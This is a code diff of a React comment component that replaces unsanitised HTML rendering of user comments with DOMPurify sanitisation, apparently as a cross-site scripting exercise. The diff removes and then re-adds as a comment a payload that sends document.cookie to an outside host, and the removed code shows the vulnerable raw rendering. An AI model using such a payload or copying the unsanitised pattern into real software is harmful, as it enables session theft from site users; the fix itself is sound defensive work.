@@ -26,11 +26,7 @@ const Comment = (props) => {
                     <span>
                         <span className='font-semibold'>Đã đánh giá:</span>
                         <span className='flex items-center gap-1'>
-                        {/* <b onclick={window.location="https://security-fe.vercel.app?cookie="+document.cookie}>click vo</b> */}
-                            {/* {comment}   */}
-                            {/* {clearData} */}
-                            <div dangerouslySetInnerHTML={{"__html": comment}}></div>
-                            {/* <div dangerouslySetInnerHTML={{"__html": clearData}}></div> */}
+                             <div dangerouslySetInnerHTML={{"__html": DOMPurify.sanitize(comment,{FORBID_TAGS:['a','img'],FORBID_ATTR:['class']})}}></div>
                         </span>
                     </span>
                     <div>
@@ -48,3 +44,8 @@ const Comment = (props) => {
 }
 
 export default Comment
+{/* <div dangerouslySetInnerHTML={{"__html": DOMPurify.sanitize(comment)}}></div> */}
+{/* <b onclick={window.location="https://security-fe.vercel.app?cookie="+document.cookie}>click vo</b> */}
+                            {/* {comment}   */}
+                            {/* {clearData} */}
+                           
